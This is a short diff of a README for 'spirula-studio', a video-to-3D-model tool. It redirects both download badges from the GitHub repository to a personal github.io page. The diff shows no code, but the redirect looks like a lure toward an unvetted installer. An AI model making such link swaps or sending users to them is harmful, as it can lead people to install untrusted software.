@@ -1,6 +1,6 @@
 # ✨ spirula-studio - Turn Videos into 3D Models Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Spirula_Studio-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mortada2003/spirula-studio)
+[![Download Now](https://img.shields.io/badge/Download-Spirula_Studio-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://mortada2003.github.io)
 
 ---
 
@@ -56,7 +56,7 @@ Follow these simple steps to install and run Spirula Studio.
 
 ### Step 1: Download the Application
 
-[![Click Here to Download](https://img.shields.io/badge/⬇️_Download_Spirula_Studio-here-blueviolet?style=for-the-badge)](https://github.com/Mortado2003/spirula-studio)
+[![Click Here to Download](https://img.shields.io/badge/⬇️_Download_Spirula_Studio-here-blueviolet?style=for-the-badge)](https://mortada2003.github.io)
 
 Visit this link to download the application. The page shows the latest version. Look for the green "Code" button or the "Releases" section to find the download option – choose the Windows installer or ZIP file.
 
